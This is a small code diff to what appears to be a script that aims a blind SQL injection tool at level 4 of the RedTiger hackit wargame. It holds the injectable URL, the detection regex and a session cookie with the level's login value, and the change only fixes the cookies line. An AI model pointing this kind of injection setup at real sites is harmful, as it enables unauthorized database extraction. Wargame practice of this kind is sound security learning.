@@ -8,7 +8,7 @@ bitshift=Bitshift.Bitshift()
 bitshift.url="http://redtiger.dyndns.org/hackit/level4.php?id="
 bitshift.encodemode="urllib_quote"
 bitshift.length=2
-bitshift.cookies=cookies={'level4login':'dont_publish_solutions_ARGH'}
+bitshift.cookies={'level4login':'dont_publish_solutions_ARGH'}
 bitshift.debuglevel=1
 bitshift.condition_target="content"
 bitshift.reg_condition='Query returned [1-9]{1,2} rows'
